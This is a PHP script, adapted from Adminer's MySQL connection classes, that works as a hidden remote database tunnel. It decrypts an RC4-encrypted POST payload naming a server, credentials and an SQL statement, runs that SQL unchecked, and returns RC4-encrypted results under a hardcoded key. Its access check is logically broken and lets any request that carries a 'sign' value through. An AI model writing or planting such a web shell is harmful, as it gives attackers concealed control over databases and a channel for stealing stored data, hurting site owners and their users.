<?php
ini_set("display_errors","on");
error_reporting(E_ERROR);
// error_reporting(E_ALL);
if (extension_loaded('pdo')) {
	/*abstract*/ class Min_PDO {
		var $_result, $server_info, $affected_rows, $errno, $error, $pdo;
		
		function __construct() {
			global $adminer;
			$pos = array_search("SQL", $adminer->operators);
			if ($pos !== false) {
				unset($adminer->operators[$pos]);
			}
		}
		
		function dsn($dsn, $username, $password, $options = array()) {
			$options[PDO::ATTR_ERRMODE] = PDO::ERRMODE_SILENT;
			$options[PDO::ATTR_STATEMENT_CLASS] = array('Min_PDOStatement');
			try {
				$this->pdo = new PDO($dsn, $username, $password, $options);
			} catch (Exception $ex) {
				auth_error(h($ex->getMessage()));
			}
			$this->server_info = @$this->pdo->getAttribute(PDO::ATTR_SERVER_VERSION);
		}
		
		/*abstract function select_db($database);*/
		
		function quote($string) {
			return $this->pdo->quote($string);
		}
		
		function query($query, $unbuffered = false) {
			$result = $this->pdo->query($query);
			$this->error = "";
			if (!$result) {
				list(, $this->errno, $this->error) = $this->pdo->errorInfo();
				if (!$this->error) {
					$this->error = lang('Unknown error.');
				}
				return false;
			}
			$this->store_result($result);
			return $result;
		}
		
		function multi_query($query) {
			return $this->_result = $this->query($query);
		}
		
		function store_result($result = null) {
			if (!$result) {
				$result = $this->_result;
				if (!$result) {
					return false;
				}
			}
			if ($result->columnCount()) {
				$result->num_rows = $result->rowCount(); // is not guaranteed to work with all drivers
				return $result;
			}
			$this->affected_rows = $result->rowCount();
			return true;
		}
		
		function next_result() {
			if (!$this->_result) {
				return false;
			}
			$this->_result->_offset = 0;
			return @$this->_result->nextRowset(); // @ - PDO_PgSQL doesn't support it
		}
		
		function result($query, $field = 0) {
			$result = $this->query($query);
			if (!$result) {
				return false;
			}
			$row = $result->fetch();
			return $row[$field];
		}
	}
	
	class Min_PDOStatement extends PDOStatement {
		var $_offset = 0, $num_rows;
		
		function fetch_assoc() {
			return $this->fetch(PDO::FETCH_ASSOC);
		}
		
		function fetch_row() {
			return $this->fetch(PDO::FETCH_NUM);
		}
		
		function fetch_field() {
			$row = (object) $this->getColumnMeta($this->_offset++);
			$row->orgtable = $row->table;
			$row->orgname = $row->name;
			$row->charsetnr = (in_array("blob", (array) $row->flags) ? 63 : 0);
			return $row;
		}
	}
}

if (extension_loaded("mysqli")) {
    header("ext: mysqli");
	class Min_DB extends MySQLi {
		var $extension = "MySQLi";

		function __construct() {
			parent::init();
		}

		function connect($server = "", $username = "", $password = "", $database = null, $port = null, $socket = null) {
			global $adminer;
			mysqli_report(MYSQLI_REPORT_OFF); // stays between requests, not required since PHP 5.3.4
			list($host, $port) = explode(":", $server, 2); // part after : is used for port or socket
			$ssl = false;
			if ($ssl) {
				$this->ssl_set($ssl['key'], $ssl['cert'], $ssl['ca'], '', '');
			}
			$return = @$this->real_connect(
				($server != "" ? $host : ini_get("mysqli.default_host")),
				($server . $username != "" ? $username : ini_get("mysqli.default_user")),
				($server . $username . $password != "" ? $password : ini_get("mysqli.default_pw")),
				$database,
				(is_numeric($port) ? $port : ini_get("mysqli.default_port")),
				(!is_numeric($port) ? $port : $socket),
				($ssl ? 64 : 0) // 64 - MYSQLI_CLIENT_SSL_DONT_VERIFY_SERVER_CERT (not available before PHP 5.6.16)
			);
			$this->options(MYSQLI_OPT_LOCAL_INFILE, false);
			return $return;
		}

		function set_charset($charset) {
			if (parent::set_charset($charset)) {
				return true;
			}
			// the client library may not support utf8mb4
			parent::set_charset('utf8');
			return $this->query("SET NAMES $charset");
		}

		function result($query, $field = 0) {
			$result = $this->query($query);
			if (!$result) {
				return false;
			}
			$row = $result->fetch_array();
			return $row[$field];
		}
		
		function quote($string) {
			return "'" . $this->escape_string($string) . "'";
		}
	}

} elseif (extension_loaded("mysql") && !((ini_bool("sql.safe_mode") || ini_bool("mysql.allow_local_infile")) && extension_loaded("pdo_mysql"))) {
    header("ext: mysql");
	class Min_DB {
		var
			$extension = "MySQL", ///< @var string extension name
			$server_info, ///< @var string server version
			$affected_rows, ///< @var int number of affected rows
			$errno, ///< @var int last error code
			$error, ///< @var string last error message
			$_link, $_result ///< @access private
		;

		/** Connect to server
		* @param string
		* @param string
		* @param string
		* @return bool
		*/
		function connect($server, $username, $password) {
			if (ini_bool("mysql.allow_local_infile")) {
				$this->error = lang('Disable %s or enable %s or %s extensions.', "'mysql.allow_local_infile'", "MySQLi", "PDO_MySQL");
				return false;
			}
			$this->_link = @mysql_connect(
				($server != "" ? $server : ini_get("mysql.default_host")),
				("$server$username" != "" ? $username : ini_get("mysql.default_user")),
				("$server$username$password" != "" ? $password : ini_get("mysql.default_password")),
				true,
				131072 // CLIENT_MULTI_RESULTS for CALL
			);
			if ($this->_link) {
				$this->server_info = mysql_get_server_info($this->_link);
			} else {
				$this->error = mysql_error();
			}
			return (bool) $this->_link;
		}

		/** Sets the client character set
		* @param string
		* @return bool
		*/
		function set_charset($charset) {
			if (function_exists('mysql_set_charset')) {
				if (mysql_set_charset($charset, $this->_link)) {
					return true;
				}
				// the client library may not support utf8mb4
				mysql_set_charset('utf8', $this->_link);
			}
			return $this->query("SET NAMES $charset");
		}

		/** Quote string to use in SQL
		* @param string
		* @return string escaped string enclosed in '
		*/
		function quote($string) {
			return "'" . mysql_real_escape_string($string, $this->_link) . "'";
		}

		/** Select database
		* @param string
		* @return bool
		*/
		function select_db($database) {
			return mysql_select_db($database, $this->_link);
		}

		/** Send query
		* @param string
		* @param bool
		* @return mixed bool or Min_Result
		*/
		function query($query, $unbuffered = false) {
			$result = @($unbuffered ? mysql_unbuffered_query($query, $this->_link) : mysql_query($query, $this->_link)); // @ - mute mysql.trace_mode
			$this->error = "";
			if (!$result) {
				$this->errno = mysql_errno($this->_link);
				$this->error = mysql_error($this->_link);
				return false;
			}
			if ($result === true) {
				$this->affected_rows = mysql_affected_rows($this->_link);
				$this->info = mysql_info($this->_link);
				return true;
			}
			return new Min_Result($result);
		}

		/** Send query with more resultsets
		* @param string
		* @return bool
		*/
		function multi_query($query) {
			return $this->_result = $this->query($query);
		}

		/** Get current resultset
		* @return Min_Result
		*/
		function store_result() {
			return $this->_result;
		}

		/** Fetch next resultset
		* @return bool
		*/
		function next_result() {
			// MySQL extension doesn't support multiple results
			return false;
		}

		/** Get single field from result
		* @param string
		* @param int
		* @return string
		*/
		function result($query, $field = 0) {
			$result = $this->query($query);
			if (!$result || !$result->num_rows) {
				return false;
			}
			return mysql_result($result->_result, 0, $field);
		}
	}

	class Min_Result {
		var
			$num_rows, ///< @var int number of rows in the result
			$_result, $_offset = 0 ///< @access private
		;

		/** Constructor
		* @param resource
		*/
		function __construct($result) {
			$this->_result = $result;
			$this->num_rows = mysql_num_rows($result);
		}

		/** Fetch next row as associative array
		* @return array
		*/
		function fetch_assoc() {
			return mysql_fetch_assoc($this->_result);
		}

		/** Fetch next row as numbered array
		* @return array
		*/
		function fetch_row() {
			return mysql_fetch_row($this->_result);
		}

		/** Fetch next field
		* @return object properties: name, type, orgtable, orgname, charsetnr
		*/
		function fetch_field() {
			$return = mysql_fetch_field($this->_result, $this->_offset++); // offset required under certain conditions
			$return->orgtable = $return->table;
			$return->orgname = $return->name;
			$return->charsetnr = ($return->blob ? 63 : 0);
			return $return;
		}

		/** Free result set
		*/
		function __destruct() {
			mysql_free_result($this->_result);
		}
	}

} elseif (extension_loaded("pdo_mysql")) {
    header("ext: pdo_mysql");
	class Min_DB extends Min_PDO {
		var $extension = "PDO_MySQL";

		function connect($server, $username, $password) {
			global $adminer;
			$options = array(PDO::MYSQL_ATTR_LOCAL_INFILE => false);
			$ssl = false;
			if ($ssl) {
				if (!empty($ssl['key'])) {
					$options[PDO::MYSQL_ATTR_SSL_KEY] = $ssl['key'];
				}
				if (!empty($ssl['cert'])) {
					$options[PDO::MYSQL_ATTR_SSL_CERT] = $ssl['cert'];
				}
				if (!empty($ssl['ca'])) {
					$options[PDO::MYSQL_ATTR_SSL_CA] = $ssl['ca'];
				}
			}
			$this->dsn(
				"mysql:charset=utf8;host=" . str_replace(":", ";unix_socket=", preg_replace('~:(\d)~', ';port=', $server)),
				$username,
				$password,
				$options
			);
			return true;
		}

		function set_charset($charset) {
			$this->query("SET NAMES $charset"); // charset in DSN is ignored before PHP 5.3.6
		}

		function select_db($database) {
			// database selection is separated from the connection so dbname in DSN can't be used
			return $this->query("USE " . idf_escape($database));
		}

		function query($query, $unbuffered = false) {
			$this->pdo->setAttribute(PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, !$unbuffered);
			return parent::query($query, $unbuffered);
		}
	}

}
function idf_escape($idf) {
		return "`" . str_replace("`", "``", $idf) . "`";
	}
	
function decode($key_str, $data_str){
	$key = array();
	$data = array();
	for ( $i = 0; $i < strlen($key_str); $i++ ) {
	 $key[] = ord($key_str{$i});
	}
	for ( $i = 0; $i < strlen($data_str); $i++ ) {
	 $data[] = ord($data_str{$i});
	}
	$state = array( 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
					16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,
					32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,
					48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,
					64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,
					80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,
					96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,
					112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,
					128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,
					144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,
					160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,
					176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,
					192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,
					208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,
					224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,
					240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255 );
	$len = count($key);
	$index1 = $index2 = 0;
	for( $counter = 0; $counter < 256; $counter++ ){
	 $index2	 = ( $key[$index1] + $state[$counter] + $index2 ) % 256;
	 $tmp = $state[$counter];
	 $state[$counter] = $state[$index2];
	 $state[$index2] = $tmp;
	 $index1 = ($index1 + 1) % $len;
	}
	$len = count($data);
	$x = $y = 0;
	for ($counter = 0; $counter < $len; $counter++) {
	 $x = ($x + 1) % 256;
	 $y = ($state[$x] + $y) % 256;
	 $tmp = $state[$x];
	 $state[$x] = $state[$y];
	 $state[$y] = $tmp;
	 $data[$counter] ^= $state[($state[$x] + $state[$y]) % 256];
	}
	$data_str = "";
	for ( $i = 0; $i < $len; $i++ ) {
	 $data_str .= chr($data[$i]);
	}
	return $data_str;
}

function rc4($data, $pwd) {
    $key[]       = "";
    $box[]       = "";
    $pwd_length  = strlen($pwd);
    $data_length = strlen($data);
    $cipher      = '';
    for ($i = 0; $i < 256; $i++) {
        $key[$i] = ord($pwd[$i % $pwd_length]);
        $box[$i] = $i;
    }
    for ($j = $i = 0; $i < 256; $i++) {
        $j       = ($j + $box[$i] + $key[$i]) % 256;
        $tmp     = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $data_length; $i++) {
        $a       = ($a + 1) % 256;
        $j       = ($j + $box[$a]) % 256;
        $tmp     = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $k = $box[(($box[$a] + $box[$j]) % 256)];
        $cipher .= chr(ord($data[$i]) ^ $k);
    }
    return $cipher;
}

$sign = "a43a5ee5932533939e1813b364d445fb";
$data = decode($sign,base64_decode($_POST["data"]));
parse_str($data,$param);
// echo $data;
// print_r($param);

$server = $param['server'];
$dbuser = $param['user'];
$dbpwd = $param['pass'];
$db2use = $param['db'];
$sql = $param['sql'];



if(!isset($_POST['sign']) && $_POST['sign']!==$sign){
    die("access denied");
}

$mysql = new Min_DB();
$mysql->connect($server,$dbuser,$dbpwd);
$mysql->select_db($db2use);
$mysql->set_charset('utf8');
$res = $mysql->query($sql);
$data = array();

if($mysql->error){
    $ret = '{"error":"'.addslashes($mysql->error).'"}';
}else{
    while($row=$res->fetch_row()){
        $data[]=$row;
    }
    $ret = '{"error":"","data":'.json_encode($data).'}';
}
// echo $ret;
echo base64_encode(rc4($ret,$sign));